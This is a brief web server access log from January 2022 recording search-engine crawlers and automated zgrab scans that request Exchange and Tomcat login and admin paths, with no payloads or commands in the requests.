66.249.70.83 - - [03/Jan/2022:01:01:17 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.199.95.200 - - [03/Jan/2022:01:07:37 +0100] "GET /owa/auth/x.js HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.208.61 - - [03/Jan/2022:01:09:15 +0100] "GET /owa/auth/logon.aspx HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
198.199.97.174 - - [03/Jan/2022:01:10:24 +0100] "GET /manager/html HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
192.241.211.144 - - [03/Jan/2022:01:11:22 +0100] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
185.191.171.18 - - [03/Jan/2022:01:38:04 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
